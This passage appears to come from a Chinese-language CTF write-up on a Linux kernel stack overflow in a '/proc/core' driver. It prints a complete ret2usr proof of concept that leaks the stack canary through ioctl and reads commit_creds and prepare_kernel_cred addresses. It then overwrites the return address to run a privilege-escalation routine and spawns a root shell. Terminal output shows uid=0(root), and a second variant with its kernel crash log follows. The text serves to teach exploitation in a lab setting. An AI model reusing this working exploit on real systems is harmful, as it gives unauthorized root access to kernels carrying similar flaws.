<p>其代码如下：</p>
<div class="sourceCode" id="cb24"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb24-1"><a href="#cb24-1" aria-hidden="true" tabindex="-1"></a><span class="dt">void</span> promote_root<span class="op">()</span></span>
<span id="cb24-2"><a href="#cb24-2" aria-hidden="true" tabindex="-1"></a><span class="op">{</span></span>
<span id="cb24-3"><a href="#cb24-3" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb24-4"><a href="#cb24-4" aria-hidden="true" tabindex="-1"></a>    <span class="dt">int</span> <span class="op">(*</span>commit_cred<span class="op">)(</span><span class="kw">struct</span> cred <span class="op">*</span>new<span class="op">);</span></span>
<span id="cb24-5"><a href="#cb24-5" aria-hidden="true" tabindex="-1"></a>    <span class="kw">struct</span> cred <span class="op">*(*</span>prepare_kernel_cred<span class="op">)(</span><span class="kw">struct</span> task_struct <span class="op">*</span>daemon<span class="op">);</span></span>
<span id="cb24-6"><a href="#cb24-6" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb24-7"><a href="#cb24-7" aria-hidden="true" tabindex="-1"></a>    commit_cred <span class="op">=</span> commit_cred_addr<span class="op">;</span></span>
<span id="cb24-8"><a href="#cb24-8" aria-hidden="true" tabindex="-1"></a>    prepare_kernel_cred <span class="op">=</span>  prepare_kernel_cred_addr<span class="op">;</span></span>
<span id="cb24-9"><a href="#cb24-9" aria-hidden="true" tabindex="-1"></a>    <span class="op">(*</span>commit_cred<span class="op">)((*</span>prepare_kernel_cred<span class="op">)(</span><span class="dv">0</span><span class="op">));</span></span>
<span id="cb24-10"><a href="#cb24-10" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb24-11"><a href="#cb24-11" aria-hidden="true" tabindex="-1"></a>    asm<span class="op">(</span><span class="st">&quot;mov %rbp,%rsp&quot;</span><span class="op">);</span>    <span class="co">//修复栈帧</span></span>
<span id="cb24-12"><a href="#cb24-12" aria-hidden="true" tabindex="-1"></a>    asm<span class="op">(</span><span class="st">&quot;pop %rbp&quot;</span><span class="op">);</span> <span class="co">//弹出rbp</span></span>
<span id="cb24-13"><a href="#cb24-13" aria-hidden="true" tabindex="-1"></a>    asm<span class="op">(</span><span class="st">&quot;mov %0,%%rax;\</span></span>
<span id="cb24-14"><a href="#cb24-14" aria-hidden="true" tabindex="-1"></a><span class="st">        jmp %%rax;&quot;</span></span>
<span id="cb24-15"><a href="#cb24-15" aria-hidden="true" tabindex="-1"></a>        <span class="op">:</span></span>
<span id="cb24-16"><a href="#cb24-16" aria-hidden="true" tabindex="-1"></a>        <span class="op">:</span><span class="st">&quot;r&quot;</span><span class="op">(</span>ret_addr<span class="op">)</span></span>
<span id="cb24-17"><a href="#cb24-17" aria-hidden="true" tabindex="-1"></a>        <span class="op">:</span><span class="st">&quot;%rax&quot;</span><span class="op">);</span></span>
<span id="cb24-18"><a href="#cb24-18" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb24-19"><a href="#cb24-19" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
<p>第一步：将rbp赋值rsp，因为rbp保存了原始的rsp（执行promote_root函数前）的值，因此只需要通过rbp还原rsp即可</p>
<p>第二步：将栈上的rbp弹出</p>
<p>第三步：直接跳转到ret_addr执行（0x:00000000000001B），此时暂时只有|–rip(ioctl)–|–rbx(ioctl)–|</p>
<p>执行效果如下：</p>
<div class="sourceCode" id="cb25"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb25-1"><a href="#cb25-1" aria-hidden="true" tabindex="-1"></a><span class="ex">/</span> $ ./exp</span>
<span id="cb25-2"><a href="#cb25-2" aria-hidden="true" tabindex="-1"></a><span class="ex">61778bf81adb4f00</span> 00007ffe3cd5d8c0 ffffffffc015719b ffff96d51f994b40 ffffffff853dd6d1 000000000000889b ffff96d517f83400 ffffffff8538ecfa 0000000000000026 0000000000000000 0000000000000000 </span>
<span id="cb25-3"><a href="#cb25-3" aria-hidden="true" tabindex="-1"></a><span class="ex">get</span> canay is:61778bf81adb4f00</span>
<span id="cb25-4"><a href="#cb25-4" aria-hidden="true" tabindex="-1"></a><span class="ex">commit_cred:ffffffff8529c8e0</span></span>
<span id="cb25-5"><a href="#cb25-5" aria-hidden="true" tabindex="-1"></a><span class="ex">prepare_kernel_cred:ffffffff8529cce0</span></span>
<span id="cb25-6"><a href="#cb25-6" aria-hidden="true" tabindex="-1"></a><span class="ex">promote_root:0000558770bc62a9</span></span>
<span id="cb25-7"><a href="#cb25-7" aria-hidden="true" tabindex="-1"></a><span class="ex">name_payload_len:88</span></span>
<span id="cb25-8"><a href="#cb25-8" aria-hidden="true" tabindex="-1"></a><span class="ex">/</span> <span class="co"># id</span></span>
<span id="cb25-9"><a href="#cb25-9" aria-hidden="true" tabindex="-1"></a><span class="va">uid</span><span class="op">=</span>0<span class="kw">(</span><span class="ex">root</span><span class="kw">)</span> <span class="va">gid</span><span class="op">=</span>0<span class="kw">(</span><span class="ex">root</span><span class="kw">)</span></span>
<span id="cb25-10"><a href="#cb25-10" aria-hidden="true" tabindex="-1"></a><span class="ex">/</span> <span class="co"># </span></span></code></pre></div>
<p>完整的poc如下：</p>
<div class="sourceCode" id="cb26"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb26-1"><a href="#cb26-1" aria-hidden="true" tabindex="-1"></a><span class="pp">#include</span><span class="im">&lt;stdio.h&gt;</span></span>
<span id="cb26-2"><a href="#cb26-2" aria-hidden="true" tabindex="-1"></a><span class="pp">#include</span><span class="im">&lt;stdlib.h&gt;</span></span>
<span id="cb26-3"><a href="#cb26-3" aria-hidden="true" tabindex="-1"></a><span class="pp">#include</span><span class="im">&lt;fcntl.h&gt;</span></span>
<span id="cb26-4"><a href="#cb26-4" aria-hidden="true" tabindex="-1"></a><span class="pp">#include</span><span class="im">&lt;string.h&gt;</span></span>
<span id="cb26-5"><a href="#cb26-5" aria-hidden="true" tabindex="-1"></a><span class="pp">#include</span><span class="im">&lt;unistd.h&gt;</span></span>
<span id="cb26-6"><a href="#cb26-6" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb26-7"><a href="#cb26-7" aria-hidden="true" tabindex="-1"></a><span class="dt">unsigned</span> <span class="dt">long</span> <span class="dt">long</span> commit_cred_addr<span class="op">;</span></span>
<span id="cb26-8"><a href="#cb26-8" aria-hidden="true" tabindex="-1"></a><span class="dt">unsigned</span> <span class="dt">long</span> <span class="dt">long</span> prepare_kernel_cred_addr<span class="op">;</span></span>
<span id="cb26-9"><a href="#cb26-9" aria-hidden="true" tabindex="-1"></a><span class="dt">unsigned</span> <span class="dt">long</span> <span class="dt">long</span> ret_addr<span class="op">;</span></span>
<span id="cb26-10"><a href="#cb26-10" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb26-11"><a href="#cb26-11" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb26-12"><a href="#cb26-12" aria-hidden="true" tabindex="-1"></a><span class="dt">void</span> promote_root<span class="op">()</span></span>
<span id="cb26-13"><a href="#cb26-13" aria-hidden="true" tabindex="-1"></a><span class="op">{</span></span>
<span id="cb26-14"><a href="#cb26-14" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb26-15"><a href="#cb26-15" aria-hidden="true" tabindex="-1"></a>    <span class="dt">int</span> <span class="op">(*</span>commit_cred<span class="op">)(</span><span class="kw">struct</span> cred <span class="op">*</span>new<span class="op">);</span></span>
<span id="cb26-16"><a href="#cb26-16" aria-hidden="true" tabindex="-1"></a>    <span class="kw">struct</span> cred <span class="op">*(*</span>prepare_kernel_cred<span class="op">)(</span><span class="kw">struct</span> task_struct <span class="op">*</span>daemon<span class="op">);</span></span>
<span id="cb26-17"><a href="#cb26-17" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb26-18"><a href="#cb26-18" aria-hidden="true" tabindex="-1"></a>    commit_cred <span class="op">=</span> commit_cred_addr<span class="op">;</span></span>
<span id="cb26-19"><a href="#cb26-19" aria-hidden="true" tabindex="-1"></a>    prepare_kernel_cred <span class="op">=</span>  prepare_kernel_cred_addr<span class="op">;</span></span>
<span id="cb26-20"><a href="#cb26-20" aria-hidden="true" tabindex="-1"></a>    <span class="op">(*</span>commit_cred<span class="op">)((*</span>prepare_kernel_cred<span class="op">)(</span><span class="dv">0</span><span class="op">));</span></span>
<span id="cb26-21"><a href="#cb26-21" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb26-22"><a href="#cb26-22" aria-hidden="true" tabindex="-1"></a>    asm<span class="op">(</span><span class="st">&quot;mov %rbp,%rsp&quot;</span><span class="op">);</span>    <span class="co">//修复栈帧</span></span>
<span id="cb26-23"><a href="#cb26-23" aria-hidden="true" tabindex="-1"></a>    asm<span class="op">(</span><span class="st">&quot;pop %rbp&quot;</span><span class="op">);</span></span>
<span id="cb26-24"><a href="#cb26-24" aria-hidden="true" tabindex="-1"></a>    asm<span class="op">(</span><span class="st">&quot;mov %0,%%rax;\</span></span>
<span id="cb26-25"><a href="#cb26-25" aria-hidden="true" tabindex="-1"></a><span class="st">        jmp %%rax;&quot;</span></span>
<span id="cb26-26"><a href="#cb26-26" aria-hidden="true" tabindex="-1"></a>        <span class="op">:</span></span>
<span id="cb26-27"><a href="#cb26-27" aria-hidden="true" tabindex="-1"></a>        <span class="op">:</span><span class="st">&quot;r&quot;</span><span class="op">(</span>ret_addr<span class="op">)</span></span>
<span id="cb26-28"><a href="#cb26-28" aria-hidden="true" tabindex="-1"></a>        <span class="op">:</span><span class="st">&quot;%rax&quot;</span><span class="op">);</span></span>
<span id="cb26-29"><a href="#cb26-29" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb26-30"><a href="#cb26-30" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span>
<span id="cb26-31"><a href="#cb26-31" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb26-32"><a href="#cb26-32" aria-hidden="true" tabindex="-1"></a><span class="dt">unsigned</span> <span class="dt">long</span> <span class="dt">long</span> get_kernel_func_addr<span class="op">(</span><span class="dt">char</span><span class="op">*</span> cmd<span class="op">)</span></span>
<span id="cb26-33"><a href="#cb26-33" aria-hidden="true" tabindex="-1"></a><span class="op">{</span></span>
<span id="cb26-34"><a href="#cb26-34" aria-hidden="true" tabindex="-1"></a>    <span class="dt">char</span> buf<span class="op">[</span><span class="dv">64</span><span class="op">];</span></span>
<span id="cb26-35"><a href="#cb26-35" aria-hidden="true" tabindex="-1"></a>    memset<span class="op">(</span>buf<span class="op">,</span><span class="dv">0</span><span class="op">,</span><span class="kw">sizeof</span><span class="op">(</span>buf<span class="op">));</span></span>
<span id="cb26-36"><a href="#cb26-36" aria-hidden="true" tabindex="-1"></a>    <span class="dt">FILE</span> <span class="op">*</span>fp <span class="op">=</span> popen<span class="op">(</span>cmd<span class="op">,</span><span class="st">&quot;r&quot;</span><span class="op">);</span></span>
<span id="cb26-37"><a href="#cb26-37" aria-hidden="true" tabindex="-1"></a>    fgets<span class="op">(</span>buf<span class="op">,</span><span class="kw">sizeof</span><span class="op">(</span>buf<span class="op">),</span>fp<span class="op">);</span></span>
<span id="cb26-38"><a href="#cb26-38" aria-hidden="true" tabindex="-1"></a>    <span class="cf">return</span> strtoul<span class="op">(</span>buf<span class="op">,</span>NULL<span class="op">,</span><span class="dv">16</span><span class="op">);</span></span>
<span id="cb26-39"><a href="#cb26-39" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span>
<span id="cb26-40"><a href="#cb26-40" aria-hidden="true" tabindex="-1"></a><span class="dt">unsigned</span> <span class="dt">long</span> <span class="dt">long</span> get_commit_cred_addr<span class="op">()</span></span>
<span id="cb26-41"><a href="#cb26-41" aria-hidden="true" tabindex="-1"></a><span class="op">{</span></span>
<span id="cb26-42"><a href="#cb26-42" aria-hidden="true" tabindex="-1"></a>    <span class="dt">char</span> <span class="op">*</span>cmd<span class="op">=</span><span class="st">&quot;cat /tmp/kallsyms |grep commit_cred|awk &#39;{print $1}&#39;&quot;</span><span class="op">;</span></span>
<span id="cb26-43"><a href="#cb26-43" aria-hidden="true" tabindex="-1"></a>    <span class="cf">return</span> get_kernel_func_addr<span class="op">(</span>cmd<span class="op">);</span></span>
<span id="cb26-44"><a href="#cb26-44" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span>
<span id="cb26-45"><a href="#cb26-45" aria-hidden="true" tabindex="-1"></a><span class="dt">unsigned</span> <span class="dt">long</span> <span class="dt">long</span> get_prepare_kernel_cred_addr<span class="op">()</span></span>
<span id="cb26-46"><a href="#cb26-46" aria-hidden="true" tabindex="-1"></a><span class="op">{</span></span>
<span id="cb26-47"><a href="#cb26-47" aria-hidden="true" tabindex="-1"></a>    <span class="dt">char</span> <span class="op">*</span>cmd<span class="op">=</span><span class="st">&quot;cat /tmp/kallsyms |grep prepare_kernel_cred|awk &#39;{print $1}&#39;&quot;</span><span class="op">;</span></span>
<span id="cb26-48"><a href="#cb26-48" aria-hidden="true" tabindex="-1"></a>    <span class="cf">return</span> get_kernel_func_addr<span class="op">(</span>cmd<span class="op">);</span></span>
<span id="cb26-49"><a href="#cb26-49" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span>
<span id="cb26-50"><a href="#cb26-50" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb26-51"><a href="#cb26-51" aria-hidden="true" tabindex="-1"></a><span class="dt">int</span> main<span class="op">(</span><span class="dt">int</span> argc<span class="op">,</span><span class="dt">char</span> <span class="op">**</span> argv<span class="op">)</span></span>
<span id="cb26-52"><a href="#cb26-52" aria-hidden="true" tabindex="-1"></a><span class="op">{</span></span>
<span id="cb26-53"><a href="#cb26-53" aria-hidden="true" tabindex="-1"></a>    <span class="dt">int</span> fd <span class="op">=</span> open<span class="op">(</span><span class="st">&quot;/proc/core&quot;</span><span class="op">,</span>O_RDWR<span class="op">);</span></span>
<span id="cb26-54"><a href="#cb26-54" aria-hidden="true" tabindex="-1"></a>    <span class="dt">unsigned</span> <span class="dt">long</span> <span class="dt">long</span> buf<span class="op">[</span><span class="dv">64</span><span class="op">];</span></span>
<span id="cb26-55"><a href="#cb26-55" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb26-56"><a href="#cb26-56" aria-hidden="true" tabindex="-1"></a>    <span class="dt">unsigned</span> <span class="dt">int</span> off_set_cmd <span class="op">=</span> <span class="bn">0x6677889C</span><span class="op">;</span></span>
<span id="cb26-57"><a href="#cb26-57" aria-hidden="true" tabindex="-1"></a>    <span class="dt">unsigned</span> <span class="dt">int</span> read_cmd <span class="op">=</span> <span class="bn">0x6677889B</span><span class="op">;</span></span>
<span id="cb26-58"><a href="#cb26-58" aria-hidden="true" tabindex="-1"></a>    <span class="dt">unsigned</span> <span class="dt">int</span> core_copy_func_cmd <span class="op">=</span> <span class="bn">0x6677889A</span><span class="op">;</span></span>
<span id="cb26-59"><a href="#cb26-59" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb26-60"><a href="#cb26-60" aria-hidden="true" tabindex="-1"></a>    <span class="co">//first setting off = 64</span></span>
<span id="cb26-61"><a href="#cb26-61" aria-hidden="true" tabindex="-1"></a>    <span class="dt">int</span> off <span class="op">=</span> <span class="dv">64</span><span class="op">;</span></span>
<span id="cb26-62"><a href="#cb26-62" aria-hidden="true" tabindex="-1"></a>    ioctl<span class="op">(</span>fd<span class="op">,</span>off_set_cmd<span class="op">,</span><span class="dv">64</span><span class="op">);</span></span>
<span id="cb26-63"><a href="#cb26-63" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb26-64"><a href="#cb26-64" aria-hidden="true" tabindex="-1"></a>    <span class="co">//call read to leak canary</span></span>
<span id="cb26-65"><a href="#cb26-65" aria-hidden="true" tabindex="-1"></a>    ioctl<span class="op">(</span>fd<span class="op">,</span>read_cmd<span class="op">,</span>buf<span class="op">);</span></span>
<span id="cb26-66"><a href="#cb26-66" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb26-67"><a href="#cb26-67" aria-hidden="true" tabindex="-1"></a>    <span class="cf">for</span> <span class="op">(</span><span class="dt">int</span> i<span class="op">=</span><span class="dv">0</span><span class="op">;</span>i<span class="op">&lt;</span><span class="dv">64</span><span class="op">;</span>i<span class="op">++)</span></span>
<span id="cb26-68"><a href="#cb26-68" aria-hidden="true" tabindex="-1"></a>    <span class="op">{</span></span>
<span id="cb26-69"><a href="#cb26-69" aria-hidden="true" tabindex="-1"></a>        printf<span class="op">(</span><span class="st">&quot;%016llx &quot;</span><span class="op">,</span>buf<span class="op">[</span>i<span class="op">]);</span></span>
<span id="cb26-70"><a href="#cb26-70" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb26-71"><a href="#cb26-71" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span></span>
<span id="cb26-72"><a href="#cb26-72" aria-hidden="true" tabindex="-1"></a>    printf<span class="op">(</span><span class="st">&quot;</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">);</span></span>
<span id="cb26-73"><a href="#cb26-73" aria-hidden="true" tabindex="-1"></a>    <span class="dt">unsigned</span> <span class="dt">long</span> <span class="dt">long</span> canary <span class="op">=</span> buf<span class="op">[</span><span class="dv">0</span><span class="op">];</span></span>
<span id="cb26-74"><a href="#cb26-74" aria-hidden="true" tabindex="-1"></a>    ret_addr <span class="op">=</span> buf<span class="op">[</span><span class="dv">2</span><span class="op">];</span></span>
<span id="cb26-75"><a href="#cb26-75" aria-hidden="true" tabindex="-1"></a>    printf<span class="op">(</span><span class="st">&quot;get canay is:%016llx</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">,</span>canary<span class="op">);</span></span>
<span id="cb26-76"><a href="#cb26-76" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb26-77"><a href="#cb26-77" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb26-78"><a href="#cb26-78" aria-hidden="true" tabindex="-1"></a>    <span class="co">//set commit_cred and prepare_kernel_cred address</span></span>
<span id="cb26-79"><a href="#cb26-79" aria-hidden="true" tabindex="-1"></a>    commit_cred_addr <span class="op">=</span> get_commit_cred_addr<span class="op">();</span></span>
<span id="cb26-80"><a href="#cb26-80" aria-hidden="true" tabindex="-1"></a>    prepare_kernel_cred_addr <span class="op">=</span> get_prepare_kernel_cred_addr<span class="op">();</span></span>
<span id="cb26-81"><a href="#cb26-81" aria-hidden="true" tabindex="-1"></a>    printf<span class="op">(</span><span class="st">&quot;commit_cred:%016llx</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">,</span>commit_cred_addr<span class="op">);</span></span>
<span id="cb26-82"><a href="#cb26-82" aria-hidden="true" tabindex="-1"></a>    printf<span class="op">(</span><span class="st">&quot;prepare_kernel_cred:%016llx</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">,</span>prepare_kernel_cred_addr<span class="op">);</span></span>
<span id="cb26-83"><a href="#cb26-83" aria-hidden="true" tabindex="-1"></a>    <span class="co">//promote_root(commit_cred_addr,prepare_kernel_cred_addr);</span></span>
<span id="cb26-84"><a href="#cb26-84" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb26-85"><a href="#cb26-85" aria-hidden="true" tabindex="-1"></a>    <span class="dt">unsigned</span> <span class="dt">long</span> <span class="dt">long</span> name_payload<span class="op">[</span><span class="dv">11</span><span class="op">];</span></span>
<span id="cb26-86"><a href="#cb26-86" aria-hidden="true" tabindex="-1"></a>    memset<span class="op">(</span>name_payload<span class="op">,</span><span class="bn">0x90</span><span class="op">,</span><span class="kw">sizeof</span><span class="op">(</span>name_payload<span class="op">));</span></span>
<span id="cb26-87"><a href="#cb26-87" aria-hidden="true" tabindex="-1"></a>    name_payload<span class="op">[</span><span class="dv">8</span><span class="op">]</span> <span class="op">=</span> canary<span class="op">;</span><span class="co">//canary</span></span>
<span id="cb26-88"><a href="#cb26-88" aria-hidden="true" tabindex="-1"></a>    name_payload<span class="op">[</span><span class="dv">10</span><span class="op">]</span> <span class="op">=</span> <span class="op">&amp;</span>promote_root<span class="op">;</span><span class="co">//rip</span></span>
<span id="cb26-89"><a href="#cb26-89" aria-hidden="true" tabindex="-1"></a>    printf<span class="op">(</span><span class="st">&quot;promote_root:%016llx</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">,</span>name_payload<span class="op">[</span><span class="dv">10</span><span class="op">]);</span></span>
<span id="cb26-90"><a href="#cb26-90" aria-hidden="true" tabindex="-1"></a>    printf<span class="op">(</span><span class="st">&quot;name_payload_len:%u</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">,</span><span class="kw">sizeof</span><span class="op">(</span>name_payload<span class="op">));</span></span>
<span id="cb26-91"><a href="#cb26-91" aria-hidden="true" tabindex="-1"></a>    <span class="co">//set name</span></span>
<span id="cb26-92"><a href="#cb26-92" aria-hidden="true" tabindex="-1"></a>    write<span class="op">(</span>fd<span class="op">,</span>name_payload<span class="op">,</span><span class="kw">sizeof</span><span class="op">(</span>name_payload<span class="op">));</span></span>
<span id="cb26-93"><a href="#cb26-93" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb26-94"><a href="#cb26-94" aria-hidden="true" tabindex="-1"></a>    <span class="co">//triger stack mash and excute shellcode to promote to root</span></span>
<span id="cb26-95"><a href="#cb26-95" aria-hidden="true" tabindex="-1"></a>    <span class="dt">long</span> <span class="dt">long</span> len <span class="op">=</span> <span class="op">-</span><span class="dv">65448</span><span class="op">;</span><span class="co">//unsigned short len =88</span></span>
<span id="cb26-96"><a href="#cb26-96" aria-hidden="true" tabindex="-1"></a>    ioctl<span class="op">(</span>fd<span class="op">,</span>core_copy_func_cmd<span class="op">,</span>len<span class="op">);</span></span>
<span id="cb26-97"><a href="#cb26-97" aria-hidden="true" tabindex="-1"></a>    <span class="co">//we are root now</span></span>
<span id="cb26-98"><a href="#cb26-98" aria-hidden="true" tabindex="-1"></a>    system<span class="op">(</span><span class="st">&quot;/bin/sh&quot;</span><span class="op">);</span></span>
<span id="cb26-99"><a href="#cb26-99" aria-hidden="true" tabindex="-1"></a>    sleep<span class="op">(</span><span class="dv">2</span><span class="op">);</span></span>
<span id="cb26-100"><a href="#cb26-100" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb26-101"><a href="#cb26-101" aria-hidden="true" tabindex="-1"></a>    <span class="cf">return</span> <span class="dv">0</span><span class="op">;</span></span>
<span id="cb26-102"><a href="#cb26-102" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
<p>需要注意：promote_root函数一定不能有参数，因为是直接jmp到该函数执行的，没有进行参数准备的操作。</p>
<p>方式2：传递给name变量用于覆盖ret_address的值地址不是promote_root函数的地址，而是从mov
%rbp，%rsp开始执行，那么执行后的栈空间布局如下：</p>
<blockquote>
<p>|–rip(ioctl)–|–rbx(ioctl)–|–size=0x10–|</p>
</blockquote>
<p>最后只需要mov %rsp,%rbp,然后正常执行leave和retn指令即可</p>
<p>promote_root代码：</p>
<div class="sourceCode" id="cb27"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb27-1"><a href="#cb27-1" aria-hidden="true" tabindex="-1"></a><span class="dt">void</span> promote_root<span class="op">()</span></span>
<span id="cb27-2"><a href="#cb27-2" aria-hidden="true" tabindex="-1"></a><span class="op">{</span></span>
<span id="cb27-3"><a href="#cb27-3" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb27-4"><a href="#cb27-4" aria-hidden="true" tabindex="-1"></a>    <span class="dt">int</span> <span class="op">(*</span>commit_cred<span class="op">)(</span><span class="kw">struct</span> cred <span class="op">*</span>new<span class="op">);</span></span>
<span id="cb27-5"><a href="#cb27-5" aria-hidden="true" tabindex="-1"></a>    <span class="kw">struct</span> cred <span class="op">*(*</span>prepare_kernel_cred<span class="op">)(</span><span class="kw">struct</span> task_struct <span class="op">*</span>daemon<span class="op">);</span></span>
<span id="cb27-6"><a href="#cb27-6" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb27-7"><a href="#cb27-7" aria-hidden="true" tabindex="-1"></a>    commit_cred <span class="op">=</span> commit_cred_addr<span class="op">;</span></span>
<span id="cb27-8"><a href="#cb27-8" aria-hidden="true" tabindex="-1"></a>    prepare_kernel_cred <span class="op">=</span>  prepare_kernel_cred_addr<span class="op">;</span></span>
<span id="cb27-9"><a href="#cb27-9" aria-hidden="true" tabindex="-1"></a>    <span class="op">(*</span>commit_cred<span class="op">)((*</span>prepare_kernel_cred<span class="op">)(</span><span class="dv">0</span><span class="op">));</span></span>
<span id="cb27-10"><a href="#cb27-10" aria-hidden="true" tabindex="-1"></a>    asm<span class="op">(</span><span class="st">&quot;mov %rbp,%rsp&quot;</span><span class="op">);</span><span class="co">//因为反汇编看出缺少部分内容</span></span>
<span id="cb27-11"><a href="#cb27-11" aria-hidden="true" tabindex="-1"></a>    asm<span class="op">(</span><span class="st">&quot;xor %rax,%rax&quot;</span><span class="op">);</span><span class="co">//设置返回值为0</span></span>
<span id="cb27-12"><a href="#cb27-12" aria-hidden="true" tabindex="-1"></a>    <span class="cf">return</span><span class="op">;</span>    </span>
<span id="cb27-13"><a href="#cb27-13" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
<p>name设置 ：</p>
<div class="sourceCode" id="cb28"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb28-1"><a href="#cb28-1" aria-hidden="true" tabindex="-1"></a>    <span class="dt">unsigned</span> <span class="dt">long</span> <span class="dt">long</span> name_payload<span class="op">[</span><span class="dv">11</span><span class="op">];</span></span>
<span id="cb28-2"><a href="#cb28-2" aria-hidden="true" tabindex="-1"></a>    memset<span class="op">(</span>name_payload<span class="op">,</span><span class="bn">0x90</span><span class="op">,</span><span class="kw">sizeof</span><span class="op">(</span>name_payload<span class="op">));</span></span>
<span id="cb28-3"><a href="#cb28-3" aria-hidden="true" tabindex="-1"></a>    name_payload<span class="op">[</span><span class="dv">8</span><span class="op">]</span> <span class="op">=</span> canary<span class="op">;</span><span class="co">//canary</span></span>
<span id="cb28-4"><a href="#cb28-4" aria-hidden="true" tabindex="-1"></a>    name_payload<span class="op">[</span><span class="dv">10</span><span class="op">]</span> <span class="op">=</span> <span class="op">(&amp;</span>promote_root<span class="op">)+</span><span class="dv">5</span><span class="op">;</span><span class="co">//rip</span></span>
<span id="cb28-5"><a href="#cb28-5" aria-hidden="true" tabindex="-1"></a>    printf<span class="op">(</span><span class="st">&quot;promote_root:%016llx</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">,&amp;</span>promote_root<span class="op">);</span></span>
<span id="cb28-6"><a href="#cb28-6" aria-hidden="true" tabindex="-1"></a>    printf<span class="op">(</span><span class="st">&quot;promote_root+5:%016llx</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">,</span>name_payload<span class="op">[</span><span class="dv">10</span><span class="op">]);</span></span>
<span id="cb28-7"><a href="#cb28-7" aria-hidden="true" tabindex="-1"></a>    printf<span class="op">(</span><span class="st">&quot;name_payload_len:%u</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">,</span><span class="kw">sizeof</span><span class="op">(</span>name_payload<span class="op">));</span></span></code></pre></div>
<p>+5 表明跳过了如下代码：</p>
<blockquote>
<p>.text:00000000000012A9 F3 0F 1E FA endbr64 .text:00000000000012AD 55
push rbp</p>
</blockquote>
<p>PS：失败了，不知道什么原因，最终会报错(后面在check下）：</p>
<div class="sourceCode" id="cb29"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb29-1"><a href="#cb29-1" aria-hidden="true" tabindex="-1"></a><span class="ex">/</span> $ ./exp-1</span>
<span id="cb29-2"><a href="#cb29-2" aria-hidden="true" tabindex="-1"></a><span class="ex">bccab44321adcd00</span> 00007fffeb602060 ffffffffc03e419b ffff8c361f99cb40 ffffffff835dd6d1 000000000000889b ffff8c361fa5c500 ffffffff8358ecfa 0000000000000026 0000000000000000 0000000000000000 </span>
<span id="cb29-3"><a href="#cb29-3" aria-hidden="true" tabindex="-1"></a><span class="ex">get</span> canay is:bccab44321adcd00</span>
<span id="cb29-4"><a href="#cb29-4" aria-hidden="true" tabindex="-1"></a><span class="ex">commit_cred:ffffffff8349c8e0</span></span>
<span id="cb29-5"><a href="#cb29-5" aria-hidden="true" tabindex="-1"></a><span class="ex">prepare_kernel_cred:ffffffff8349cce0</span></span>
<span id="cb29-6"><a href="#cb29-6" aria-hidden="true" tabindex="-1"></a><span class="ex">promote_root:0000558988bed2a9</span></span>
<span id="cb29-7"><a href="#cb29-7" aria-hidden="true" tabindex="-1"></a><span class="ex">promote_root+5:0000558988bed2ae</span></span>
<span id="cb29-8"><a href="#cb29-8" aria-hidden="true" tabindex="-1"></a><span class="ex">name_payload_len:88</span></span>
<span id="cb29-9"><a href="#cb29-9" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>   44.476640] core: called <span class="er">core_writen</span></span>
<span id="cb29-10"><a href="#cb29-10" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>   44.508902] general protection <span class="er">fault:</span> <span class="ex">0000</span> [#1] SMP NOPTI</span>
<span id="cb29-11"><a href="#cb29-11" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>   44.518681] Modules linked <span class="er">in:</span> <span class="ex">core</span><span class="er">(</span><span class="ex">O</span><span class="kw">)</span></span>
<span id="cb29-12"><a href="#cb29-12" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>   44.523341] CPU: 0 <span class="er">PID:</span> <span class="ex">1008</span> Comm: exp-1 Tainted: G           O     4.15.8 <span class="co">#19</span></span>
